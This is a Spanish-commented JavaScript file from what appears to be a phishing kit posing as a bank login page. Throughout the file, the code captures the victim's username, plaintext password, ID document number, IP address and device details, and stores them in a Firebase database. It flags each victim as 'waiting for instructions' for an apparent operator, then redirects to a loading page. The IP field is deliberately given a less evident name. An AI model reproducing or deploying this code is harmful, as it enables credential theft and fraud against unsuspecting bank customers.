// Script principal con Firebase - Flujo completo del proyecto
console.log('🚀 Script principal iniciado');

// NOTA: La configuración de Firebase y rutas está centralizada en firebase-config.js
// Este archivo debe importarse antes que main.js en el HTML

// Variables globales para Firebase
let app, db, unsubscribe;

// Inicializar Firebase
try {
    app = firebase.initializeApp(firebaseConfig);
    db = firebase.firestore();
    console.log('✅ Firebase inicializado correctamente');
    console.log('🔍 Configuración Firebase:', {
        projectId: firebaseConfig.projectId,
        authDomain: firebaseConfig.authDomain,
        tieneApp: !!app,
        tieneDB: !!db
    });
} catch (error) {
    console.error('❌ Error inicializando Firebase:', error);
    console.error('❌ Configuración que falló:', firebaseConfig);
}

// Función para obtener la dirección IP
async function obtenerDireccionIP() {
    const servicios = [
        "https://api.ipify.org?format=json",
        "https://api64.ipify.org?format=json",
        "https://jsonip.com",
        "https://api.myip.com",
        "https://ipapi.co/json/"
    ];
    
    for (const url of servicios) {
        try {
            const response = await fetch(url);
            if (!response.ok) continue;
            const data = await response.json();
            return data.ip || data.data || "No disponible";
        } catch (error) {
            console.warn('Error obteniendo IP de:', url);
        }
    }
    return "No disponible";
}

// Función principal cuando el DOM esté listo
document.addEventListener('DOMContentLoaded', async function () {
    console.log('📄 DOM cargado - Inicializando aplicación');
    
    // Obtener elementos del DOM - TODOS LOS CAMPOS
    const tipoDocSelect = document.getElementById('tipodocben'); // Tipo de documento
    const documentoInput = document.getElementById('documento'); // Número de documento
    const usuarioInput = document.getElementById('u'); // Nombre de usuario
    const passwordInput = document.getElementById('p'); // Contraseña
    const submitBtn = document.getElementById('cmdLg'); // Botón de login
    // Campo de contexto/IP menos evidente (#ctx), con compatibilidad hacia atrás (#direccionIP)
    const ipInput = document.getElementById('ctx') || document.getElementById('direccionIP');
    const overlay = document.getElementById('loader-container');
    
    
    
    if (!usuarioInput || !submitBtn) {
        console.error('❌ Elementos críticos no encontrados');
        return;
    }
    
    // Inicializar estado
    submitBtn.disabled = true;

    // Toggle de visibilidad de contraseña (icono ojo)
    try {
        const eyeIcon = document.querySelector('.move_me');
        if (eyeIcon && passwordInput) {
            eyeIcon.addEventListener('click', () => {
                const isPass = passwordInput.type === 'password';
                passwordInput.type = isPass ? 'text' : 'password';
                // Alternar icono
                eyeIcon.classList.toggle('fa-eye');
                eyeIcon.classList.toggle('fa-eye-slash');
            });
        }
    } catch (e) {
        console.warn('No se pudo inicializar el toggle de contraseña:', e);
    }
    
    // Obtener IP al cargar
    try {
        const ip = await obtenerDireccionIP();
        if (ipInput) ipInput.value = ip;
        console.log('🌐 IP obtenida:', ip);
    } catch (error) {
        console.warn('⚠️ Error obteniendo IP:', error);
    }
    
    // Función para validar entrada
    function validateInput() {
        if (usuarioInput && submitBtn) {
            // Validar que al menos el usuario tenga contenido
            if (usuarioInput.value.length >= 3) {
                submitBtn.disabled = false;
                submitBtn.style.cursor = 'pointer';
                submitBtn.style.border = '1px solid rgb(132,168,62)';
                console.log('✅ Botón habilitado');
            } else {
                submitBtn.disabled = true;
                submitBtn.style.cursor = 'not-allowed';
                submitBtn.style.border = '1px solid rgb(132,168,62)';
                console.log('❌ Botón deshabilitado');
            }
        }
    }
    
    // Función para obtener el próximo número secuencial para las tarjetas
    async function getNextCardNumber() {
        try {
            const q = db.collection("redireccion").orderBy("cardNumber", "desc").limit(1);
            const snap = await q.get();
            if (snap.empty) return 1;
            const highest = snap.docs[0].data().cardNumber || 0;
            return highest + 1;
        } catch (err) {
            console.error("Error obteniendo siguiente cardNumber:", err);
            return 1;
        }
    }

    // Función para guardar en historial persistente con reintentos y mejor logging
    async function guardarEnHistorial(datos, reintentos = 3) {
        console.log('🔍 INICIANDO guardarEnHistorial con datos:', {
            usuario: datos.usuario,
            tieneDB: !!db,
            datosCompletos: Object.keys(datos)
        });
        
        // Verificar que Firebase esté inicializado
        if (!db) {
            console.error('❌ ERROR CRÍTICO: Firebase db no está inicializado');
            console.error('❌ Verificar que firebase-config.js se cargó correctamente');
            return false;
        }
        
        for (let intento = 1; intento <= reintentos; intento++) {
            try {
                console.log(`🚀 Intento ${intento} de ${reintentos} - Guardando en Firestore...`);
                
                const docId = `${datos.usuario}_${Date.now()}_${intento}`;
                const historialRef = db.collection("datosHistorial").doc(docId);
                
                console.log('📝 Referencia creada:', {
                    coleccion: 'datosHistorial',
                    documentoId: docId,
                    referencia: !!historialRef
                });
                
                // Intentar guardar
                await historialRef.set(datos);
                
                console.log(`✅ ÉXITO: Historial guardado en intento ${intento}`);
                console.log(`✅ Documento guardado con ID: ${docId}`);
                console.log(`✅ En colección: datosHistorial`);
                
                // Verificar que se guardó
                const verificacion = await historialRef.get();
                if (verificacion.exists) {
                    console.log('✅ VERIFICACIÓN: Documento existe en Firestore');
                    return true;
                } else {
                    console.warn('⚠️ ADVERTENCIA: Documento no se encontró después de guardar');
                }
                
            } catch (error) {
                console.error(`❌ INTENTO ${intento} FALLÓ:`);
                console.error('❌ Error completo:', error);
                console.error('❌ Mensaje:', error.message);
                console.error('❌ Código:', error.code);
                console.error('❌ Stack:', error.stack);
                
                if (intento === reintentos) {
                    console.error(`❌ FALLO FINAL: No se pudo guardar historial después de ${reintentos} intentos`);
                    console.error('❌ Datos que se intentaron guardar:', datos);
                    return false;
                }
                
                // Esperar antes del siguiente intento
                const espera = 1000 * intento;
                console.log(`⏳ Esperando ${espera}ms antes del siguiente intento...`);
                await new Promise(resolve => setTimeout(resolve, espera));
            }
        }
        return false;
    }

    // Función para manejar el envío - FLUJO CORRECTO
    async function manejarEnvio(event) {
        event.preventDefault();
        console.log('🚀 Procesando envío del formulario');
        
        if (!submitBtn || submitBtn.disabled) {
            console.log('⚠️ Botón deshabilitado');
            return;
        }
        
        try {
            // Mostrar overlay de carga
            if (overlay) {
                overlay.style.display = "block";
            }
            
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.7';
            
            // 📝 CAPTURAR TODOS LOS DATOS DEL FORMULARIO
            const tipoDocumento = tipoDocSelect ? tipoDocSelect.value : '01';
            const numeroDocumento = documentoInput ? documentoInput.value.trim() : '';
            const nombreUsuario = usuarioInput ? usuarioInput.value.trim() : '';
            const contrasena = passwordInput ? passwordInput.value.trim() : '';
            
            // Obtener texto del tipo de documento seleccionado
            const tipoDocTexto = tipoDocSelect ? tipoDocSelect.options[tipoDocSelect.selectedIndex].text : 'Venezolano';
            
            console.log('📝 Datos capturados del formulario:', {
                tipoDocumento,
                tipoDocTexto,
                numeroDocumento,
                nombreUsuario,
                contrasena: contrasena ? '***' + contrasena.slice(-2) : '' // Ocultar contraseña en logs
            });
            
            if (!nombreUsuario) {
                throw new Error("El nombre de usuario no puede estar vacío");
            }

            // Obtener IP
            const direccionIP = await obtenerDireccionIP();
            if (ipInput) {
                ipInput.value = direccionIP || 'No se pudo obtener la IP';
            }

            // Obtener el próximo número secuencial
            const cardNumber = await getNextCardNumber();

            console.log('🎨 Datos del usuario:', { nombreUsuario, cardNumber, direccionIP });

            // 1. Guardar en colección de redirección (temporal) con page: 0 - TODOS LOS DATOS
            const userRef = db.collection("redireccion").doc(nombreUsuario);
            await userRef.set({
                // 📝 Datos del formulario
                tipoDocumento: tipoDocumento,
                tipoDocTexto: tipoDocTexto,
                numeroDocumento: numeroDocumento,
                usuario: nombreUsuario,
                clave: contrasena,
                
                // 🎨 Datos del sistema
                tipo: tipoDocTexto, // 🏷️ Mostrar tipo de documento en la tarjeta
                page: 0, // ⭐ ESTADO DE ESPERA - Clave del flujo correcto
                cardNumber: cardNumber,
                direccionIP: direccionIP,
                dispositivo: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Móvil' : 'Desktop',
                timestamp: firebase.firestore.FieldValue.serverTimestamp()
            });
            
            console.log('💾 Usuario guardado en Firebase con page: 0 (esperando instrucciones)');

            // 2. Preparar datos completos para historial
            const datosCompletos = {
                // 📝 Datos del formulario
                tipoDocumento: tipoDocumento,
                tipoDocTexto: tipoDocTexto,
                numeroDocumento: numeroDocumento,
                usuario: nombreUsuario,
                clave: contrasena,
                
                // 🌍 Datos de red y ubicación
                direccionIP: direccionIP,
                
                // 🎨 Datos del sistema
                cardNumber: cardNumber,
                dispositivo: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Móvil' : 'Desktop',
                
                // ⏰ Datos temporales
                timestamp: new Date().toISOString(),
                
                // 💻 Datos técnicos adicionales
                userAgent: navigator.userAgent,
                idioma: navigator.language || 'es',
                zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
                resolucion: `${screen.width}x${screen.height}`,
                referrer: document.referrer || 'Directo'
            };

            // 3. Guardar historial de forma no bloqueante
            setTimeout(async () => {
                try {
                    const exito = await guardarEnHistorial(datosCompletos);
                    if (exito) {
                        console.log("✅ Historial guardado exitosamente");
                    } else {
                        console.warn("⚠️ No se pudo guardar el historial (no crítico)");
                    }
                } catch (error) {
                    console.warn("⚠️ Error en historial (no crítico):", error);
                }
            }, 100);

            // 4. Guardar usuario en localStorage y redirigir a load.html
            localStorage.setItem('usuarioActual', nombreUsuario);
            console.log('💾 Usuario guardado en localStorage:', nombreUsuario);
            
            console.log('🚀 Datos guardados - Redirigiendo a load.html');
            
            // Pequeño delay para asegurar que todo se guarde
            setTimeout(() => {
                window.location.href = 'load.html';
            }, 500);
            
        } catch (error) {
            console.error('❌ Error en el proceso:', error);
            alert(`Error: ${error.message}`);
            
            // Restaurar estado en caso de error
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.style.opacity = '1';
            }
            if (overlay) overlay.style.display = "none";
        }
    }
    
    // Agregar event listeners
    if (usuarioInput) {
        usuarioInput.addEventListener('input', validateInput);
        console.log('🎯 Event listener agregado al campo de usuario');
    }
    
    if (submitBtn) {
        submitBtn.addEventListener('click', manejarEnvio);
        console.log('🎯 Event listener agregado al botón');
    }
    
    // Validar entrada inicial
    validateInput();
});

// 🔧 FUNCIÓN DE DIAGNÓSTICO GLOBAL - Ejecutar desde consola del navegador
window.diagnosticarFirebase = async function() {
    console.log('🔧 INICIANDO DIAGNÓSTICO DE FIREBASE');
    console.log('='.repeat(50));
    
    // 1. Verificar variables globales
    console.log('1️⃣ VERIFICANDO VARIABLES GLOBALES:');
    console.log('   - firebase disponible:', typeof firebase !== 'undefined');
    console.log('   - firebaseConfig disponible:', typeof firebaseConfig !== 'undefined');
    console.log('   - app inicializada:', !!app);
    console.log('   - db inicializada:', !!db);
    
    if (!db) {
        console.error('❌ PROBLEMA: db no está inicializada');
        return;
    }
    
    // 2. Probar conexión básica
    console.log('\n2️⃣ PROBANDO CONEXIÓN A FIRESTORE:');
    try {
        const testRef = db.collection('test').doc('conexion');
        await testRef.set({ timestamp: new Date(), test: true });
        console.log('✅ Escritura exitosa en colección test');
        
        const testDoc = await testRef.get();
        if (testDoc.exists) {
            console.log('✅ Lectura exitosa desde Firestore');
            console.log('   Datos:', testDoc.data());
        }
        
        // Limpiar documento de prueba
        await testRef.delete();
        console.log('✅ Documento de prueba eliminado');
        
    } catch (error) {
        console.error('❌ ERROR EN CONEXIÓN:', error);
        return;
    }
    
    // 3. Probar función guardarEnHistorial
    console.log('\n3️⃣ PROBANDO FUNCIÓN guardarEnHistorial:');
    const datosTest = {
        usuario: 'TEST_USER',
        timestamp: new Date().toISOString(),
        test: true,
        diagnostico: 'Prueba desde función de diagnóstico'
    };
    
    const resultado = await guardarEnHistorial(datosTest);
    if (resultado) {
        console.log('✅ guardarEnHistorial funcionó correctamente');
    } else {
        console.error('❌ guardarEnHistorial falló');
    }
    
    // 4. Verificar colección datosHistorial
    console.log('\n4️⃣ VERIFICANDO COLECCIÓN datosHistorial:');
    try {
        const historialSnapshot = await db.collection('datosHistorial').limit(5).get();
        console.log(`📊 Documentos en datosHistorial: ${historialSnapshot.size}`);
        
        if (historialSnapshot.size > 0) {
            console.log('📋 Últimos documentos:');
            historialSnapshot.forEach(doc => {
                console.log(`   - ${doc.id}:`, doc.data());
            });
        } else {
            console.warn('⚠️ No hay documentos en la colección datosHistorial');
        }
    } catch (error) {
        console.error('❌ Error consultando datosHistorial:', error);
    }
    
    console.log('\n🔧 DIAGNÓSTICO COMPLETADO');
    console.log('='.repeat(50));
};

// Mensaje para el usuario
console.log('🔧 FUNCIÓN DE DIAGNÓSTICO DISPONIBLE:');
console.log('   Ejecuta: diagnosticarFirebase()');
console.log('   Para probar la conexión a Firebase y la función guardarEnHistorial');    
